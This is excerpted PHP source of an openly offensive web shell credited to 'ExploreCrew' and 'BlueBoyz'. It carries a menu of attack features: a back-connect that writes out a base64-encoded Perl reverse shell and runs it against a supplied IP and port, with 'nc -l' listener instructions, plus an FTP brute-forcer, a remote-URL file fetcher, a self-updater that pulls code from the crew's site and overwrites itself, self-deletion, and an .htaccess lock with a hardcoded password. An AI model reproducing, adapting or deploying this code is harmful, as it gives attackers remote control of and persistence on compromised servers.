...
##[ CONFIGURATIONS ]##
##[ URL ]##
#$sh_mainurl        = "http://localhost/BlueBoyz/";
$sh_mainurl        = 'http://explorecrew.org/';
$x_updateurl  = $sh_mainurl."x_update.php";
$x_sourcesurl = $sh_mainurl."BlueBoyz.txt";
$sh_sourcez = array(
  "--==[ExploreCrew WebShell]==--"   => array($sh_mainurl."shellz/cyberz.txt","BlueBoyz.php"),
...
##[ ADVANCED ]##
$tmp_dir       = "";
$log_email     = "evilcode@windowslive.com";
$sess_cookie   = "BlueBoyz";
$sort_default  = "0a";
$sort_save     = TRUE;
$copy_unset    = FALSE;
$gzipencode    = TRUE;
...
if (!is_windows()) {
  ...
  $cmdaliases = array(
    ...
    array("Find x99shell in current dir", "find /c \"x99\" *"),
    array("Find x57shell in current dir", "find /c \"x57\" *"),
...
$quicklaunch = array(
    ...
    array("Kill Shell",$surl."act=selfremove&d=%d"),
    array("Images",$surl."act=img&img=listall"),
    array("-",""),
    array("Folder Lock",$surl."act=flock&d=%d"),
    array("X-Uploader",$surl."act=tools&d=%d"),
    array("Hspere Jump",$surl."act=hsphere&d=%d"),
    array("Back-Connect",$surl."act=backc&d=%d"),
    array("Update",$surl."act=update")
);
if ( !is_windows() )
	$quicklaunch[] = array("<br>FTP Brut3",$surl."act=ftpquickbrute&d=%d");
##[ FILE TYPES ]##
$ftypes = array(
...
<div id="main">
	...
	<table id="pagebar">
		...
		<table class="info">
<?php
  srv_info("Server",srv_software($surl));
...
<?php
  ...
  if ($act == "ftpquickbrute") {
    ...
    if (!empty($submit)) {
      ...
      $logfile = $tmp_dir."x_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
...
<?php
    if ((@$submit == @$rndcode) && (@$submit != "")) {
      if (unlink(__FILE__)) { @ob_clean(); echo "Thanks for using ".sh_name()."!"; BlueBoyzexit(); }
...
<?php
  ...
  ##[ FEEDBACK ]##
  if ($act == "feedback") {
    $suppmail = base64_decode("ZXZpbGNvZGVAd2luZG93c2xpdmUuY29t");
    if (!empty($submit)) {
...
<?php
  ...
  if ($act == "f") {
    ...
    if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") {
      ...
      elseif ($ft == "html") {
        if ($newwin) { @ob_clean(); echo $r; BlueBoyzexit(); }
        else { echo $r; }
      }
      elseif ($ft == "txt") {
      ...
      elseif ($ft == "code") {
        ...
        if (@$newwin) { @ob_clean(); highlight_file($d.$f); BlueBoyzexit(); }
...
<?php
  ...
  if ($act == "phpinfo") { @ob_clean(); phpinfo(); BlueBoyzexit(); }
  if ($act == "tools") { x_tools(); }
  if ($act == "hsphere") { hsphere_jump(); }
  if ($act == "backc") { backconnect(); }
  if ($act == "flock") { folder_lock(); }
  if ($act == "about") { x_about(); }
}
##[ END OF ACTIONS ]##
######################
##[ COMMANDS PANEL ]##
...
##[ ExploreCrew UPDATE FUNCTIONS ]##
function x_getupdate($update = FALSE) {
  global $x_updateurl;
  $url = $x_updateurl."?version=".urlencode(base64_encode(sh_ver));
  $data = @file_get_contents($url);
  if (!$data) { return "<div class=errmsg>Can't connect to update-server! ($x_updateurl)</div>"; }
  else {
    $data = ltrim($data);
     ...
     $string = substr($data,3,ord($data{2}));
      ...
      if ($update) {
        ...
        if (!$source) { return "Can't fetch update!"; }
          ...
          $fp = @fopen(__FILE__,"w");
          if (!$fp) { return "Local error: can't write update to ".__FILE__."! You may download --==|HN-Crew WebShell|==-- manually <a href=\"".$sourceurl."\"><u>here</u></a>."; }
          else {
            fwrite($fp,$source);
            fclose($fp);
...
##[ END ExploreCrew UPDATE FUNCTIONS ]##
...
##[ ExploreCrew EXIT FUNCTIONS ]##
function BlueBoyzexit() {
...
##[ END OF ExploreCrew EXIT FUNCTIONS ]##
...
function mysql_query_form() {
  ...
  if ((!$submit) or ($sql_act)) {
    echo "<table><tr><td><form name=\"x_sqlquery\" method=\"post\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
    if ($tbl_struct) {
      echo "<td valign=\"top\"><b>Fields:</b><br>";
      foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.x_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
      echo "</td></tr></table>";
    }
  }
...
function sh_name() { return base64_decode("LS09PT1bIEV4cGxvcmVDcmV3IFdlYlNoZWxsIF09PT0tLQ=="); }
function sh_shell() { return base64_decode(""); }
function sh_comm() { return base64_decode("LS0gRXhwbG9yZUNyZXcgVW5kZXJHcm91bmRlciAtLQ=="); }
//
//
function x_tools() {
  bar_header("..:: X-Uploader ::..");
	?>
	<table>
	<tr>
		<form method="post" action="" enctype="multipart/form-data" >
		<td><center>
		<p>Upload From Website</p>
		<input type="text" name="filename" value="" />
		<input type="text" name="fileurl" value="http://localhost/ihsana/xx" />
		<input  type="submit" name="UploadUrl" value="Get It" /></center>
		</td>
		</tr>
		<tr>
		<td><center><p>From Computer</p>
		<input type="file" name="filelocal" />
		<input type="submit" name="UploadLocal" value="Get" /></center>
		</form>
	<center>
	</td>
	</tr>
  ...
  bar_header("..:: BlueBoyz ::..");
////////////////////////
function JZClean($text){
	if (get_magic_quotes_gpc()) {
		 $text = stripslashes($text);
	}
	return $text;
}
function JZFileopen($file){
	$content = "";
...
function JZFilesave($file,$content){
...
$newdir = htmlspecialchars($_GET['d']);
if(isset($_POST['UploadUrl'])){
		$filename = JZClean(trim($_POST['filename']));
		$fileurl = JZClean(trim($_POST['fileurl']));
		if($filename == "") $filename = basename($fileurl);
		$filepath = $newdir.$filename;
		if($fileurl != ""){
			$con = JZFileopen($fileurl);
			JZFilesave($filepath,$con);
		}
	}
elseif(isset($_POST['UploadLocal'])){
...
function folder_lock() {
  bar_header("..:: Folder Lock ::..");
?>
<table>
<tr>
    <td>
	...
	Username :<br/><input name="username" size="25" type="text" value="BlueBoyz" /><br/><br/>
        Folder :<br/><input type="text" size="50" name="folder" value="<?php echo htmlspecialchars($_GET['d']) ?>" /><br/><br/>
	<input type="submit" name="folderprot" value="Protect" />
	</form>
	<center>    
</td>
</tr>
...
<?php
if(isset($_POST['folderprot'])){
    $path = htmlspecialchars($_POST['folder']);
    $username = $_POST['username']; 
    $fileProt = base64_decode("QXV0aE5hbWUgIlByb3RlY3QgYnkgSnpTZWN1cml0eSINCkF1dGhUeXBlIEJhc2ljDQpyZXF1aXJlIHZhbGlkLXVzZXINCg0KDQpBdXRoVXNlckZpbGUgIg==").$path.'.jzFlock"';
    function err_WrFile() { $err = "Error Can't connect!" ; return $err ;}
	function WrFile ($fname,$text) {
	  $w_file=@fopen($fname,"w") or err_WrFile();
	  if($w_file) {
	    @fputs($w_file,$text);
	    @fclose($w_file);
	  }
	}
    WrFile($path.".jzFlock", $username . base64_decode("OiRhcHIxJG9aZHZyZnNCJHFnSFAweEdCclZjS3o1eVc0RnZ3ajA="));
    WrFile($path.".htaccess", $fileProt );
    echo '<p style="color: red;" >Username : '.$username.' & Password : "090885"</p>';
}
}
function hsphere_jump(){
    bar_header("..:: HSPERE JUMP ::..");
    ...
    $dirRoot = trim($DRoot[0]) ;
    
    $dir .= "<tr><td>".$SName[0]."</td><td><a href='?act=ls&d=".$dirRoot."' >".$dirRoot."</a></td><td></td></tr>";
    }
    closedir($opendir);
    $dir .= "</table>";
    echo $dir ;
...
function backconnect() {
  bar_header("..:: Back-Connect ::..");
	?>
<table>
<tr><td><center><br/><strong>Back Connect</strong><br/><br/>
	<form method="POST" action="" >
		Port : <br/><input name="bportC" value="2012" type="text" /><br/><br/>
		IP Remote : <br/><input name="bipC" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>" type="text" ><br/><br/>
		<input name="btnConnect" value="Back Connect" type="submit"/> 
	</form><br/>
	<p>run "nc -l 2012" on your PC and then press 'Back Connect'.</p>
	<center><br/>
    </td>
    <td><center><br/><strong>Windows Bind Port</strong><br/><br/>
	<form method="POST" action="" >
		Port : <br/><input name="bportC" value="2012" type="text" /><br/><br/>
		IP Remote : <br/><input name="bipC" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>" type="text" ><br/><br/>
		<input name="btnConnectW" value="Back Connect" type="submit"/> 
	</form><br/>
	<p>run "nc -l 2012" on your PC and then press 'Back Connect'.</p>
	<center><br/>
    </td>
...
<?php
if(isset($_POST['btnConnect']) && (is_numeric($_POST['bportC']))){
		$port = $_POST['bportC'];
		$ip = $_POST['bipC'];
	function err_write() { $err = "Error Can't connect!" ; return $err ;}
	function WriteFile ($fname,$text) {
	  $w_file=@fopen($fname,"w") or err_write();
	  if($w_file) {
	    @fputs($w_file,@base64_decode($text));
	    @fclose($w_file);
	  }
	}
	$JzShell_pl = "";
	fx29exec("rm -rf jzshpl" );
	WriteFile(htmlspecialchars($_GET['d'])."jzshpl", $JzShell_pl);     
	$chmodx = fx29exec("chmod 777 ".htmlspecialchars($_GET['d'])."jzshpl");
	$shellx = fx29exec("perl ".htmlspecialchars($_GET['d'])."jzshpl ".$ip." ".$port." &");
        }
//
if(isset($_POST['btnConnectW']) && (is_numeric($_POST['bportC']))){
		$port = $_POST['bportC'];
		$ip = $_POST['bipC'];
	function err_write() { $err = "Error Can't connect!" ; return $err ;}
	function WriteFile ($fname,$text) {
...
$JzShell_pl="dXNlIFNvY2tldDsKJHBvcnQJPSAkQVJHVlswXTsKJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3Rj
...
VERJTik7CmNsb3NlKFNURE9VVCk7CmNsb3NlKFNUREVSUik7Cn0g";
	WriteFile(htmlspecialchars($_GET['d'])."jzshpl", $JzShell_pl);     
	$shellx = fx29exec("perl jzshpl ".$ip." ".$port." &");
        }
echo "<br/><p style='color: red;' >" ;
print_r($chmodx) ;print_r($shellx) ;
echo "</p><br/>" ;
}
function x_about() {
  bar_header(".: Credits :.");
  echo "<br>Idea, leader & coder: <b>--==[ExploreCrew.Org]==--</b><br>".
       "Beta-tester & tips: <b>All member ExploreCrew.Org</b><br>".
       "Re-coder, Designer, Windows Fix, PHP Mailer & PHP Filesystem: <b>-==[BlueBoyz]==--</b><br><br>".
       "[Special Thank's]<br>".
	   "<b>--==|ArRay|gt_Portnoy|N4is3n|BEJAMZ|BlueBoyz|Samu1241|Riphack|ClassicRose|RoNz|==--</b><br><br>".
       "Please report bugs to <a href=\"mailto:evilcode@windowslive.com\">-==[ ExploreCrew ]==--</a></b>\n";
}
function html_style() {
$style = '<html>
<head>
...
function html_footer() { return "&copy; 2011 By BlueBoyz Recoded By ExploreCrew UnderGround. Generated: ".round(getmicrotime()-starttime,4)." seconds"; }
